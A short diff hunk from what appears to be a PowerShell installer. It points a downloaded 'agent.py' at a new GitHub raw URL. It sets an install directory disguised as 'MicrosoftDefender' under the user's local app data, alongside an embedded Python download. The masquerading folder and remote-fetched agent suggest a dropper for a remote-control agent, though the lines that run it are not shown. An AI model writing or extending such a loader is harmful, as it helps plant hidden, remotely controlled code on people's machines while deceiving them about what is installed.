@@ -6,7 +6,7 @@
 $TargetDirectory = "$env:LOCALAPPDATA\MicrosoftDefender"
 $PythonVersion = "3.10.11"
 $PythonUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
-$AgentUrl = "https://lumen.swirly.hackclub.app/agent.py" # Public URL to your agent.py
+$AgentUrl = "https://raw.githubusercontent.com/BadPotato1007/zoro-v1/refs/heads/main/agent.py" # Public URL to your agent.py
 
 # --- Main Execution ---
 
